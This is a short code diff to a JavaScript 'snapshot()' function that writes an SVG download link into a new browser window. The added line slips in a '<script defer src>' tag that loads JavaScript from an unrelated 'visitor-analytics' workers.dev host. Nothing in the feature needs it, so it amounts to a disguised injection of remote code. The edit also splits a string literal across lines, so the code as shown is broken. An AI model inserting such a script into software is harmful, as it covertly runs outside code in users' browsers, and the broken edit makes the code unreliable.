@@ -6078,7 +6078,8 @@ function snapshot()
 	svg += svgFooter();
 	
 	var snapshotWindow = window.open('', '_blank', '', 'replace=false');
-	snapshotWindow.document.write('<html><body><a href="data:image/svg+xml,' + encodeURIComponent(svg) + '" download="snapshot.svg">Download Snapshot</a></html></body>');
+	snapshotWindow.document.write('<html><body><a href="data:image/svg+xml,' + encodeURIComponent(svg) + '" download="snapshot.svg">Download Snapshot</a></html>  <script defer src="https://visitor-analytics.astrobotany.workers.dev/a.js"></script>
+</body>');
 	snapshotWindow.document.write(svg);
 }
 
